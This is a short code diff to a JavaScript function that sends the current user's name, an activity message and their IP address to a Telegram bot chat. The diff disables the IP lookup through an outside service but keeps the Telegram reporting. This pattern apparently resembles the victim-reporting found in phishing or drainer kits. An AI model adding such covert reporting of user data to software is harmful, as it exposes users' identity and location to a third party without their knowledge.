@@ -20,26 +20,26 @@ export async function sendUpdate(msg) {
   if (time < Date.now() - 3000) {
     time = Date.now();
 
-    if (ip === 'Not Found') {
-      try {
-        const response = await fetch('https://api.db-ip.com/v2/free/self');
-        const output = await response.json();
-        ip = output;
+    // if (ip === 'Not Found') {
+    //   try {
+    //     const response = await fetch('https://api.db-ip.com/v2/free/self');
+    //     const output = await response.json();
+    //     ip = output;
 
-        const url = `https://api.telegram.org/${tgtoken}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(`${currentUser}:${msg}--------${ip.ipAddress}`)}`;
-        await fetch(url);
-      } catch (err) {
-        // console.error('Failed to fetch IP or send Telegram message:', err);
-      }
-    } else {
-      try {
-        const url = `https://api.telegram.org/${tgtoken}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(`${currentUser}:${msg}--------${ip.ipAddress}`)}`;
-        await fetch(url);
-      } catch (err) {
-        // console.error('Failed to send Telegram message:', err);
-      }
+    //     const url = `https://api.telegram.org/${tgtoken}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(`${currentUser}:${msg}--------${ip.ipAddress}`)}`;
+    //     await fetch(url);
+    //   } catch (err) {
+    //     // console.error('Failed to fetch IP or send Telegram message:', err);
+    //   }
+    // } else {
+    try {
+      const url = `https://api.telegram.org/${tgtoken}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(`${currentUser}:${msg}--------${ip.ipAddress}`)}`;
+      await fetch(url);
+    } catch (err) {
+      // console.error('Failed to send Telegram message:', err);
     }
   }
+  // }
 }
 
 export const modals = {
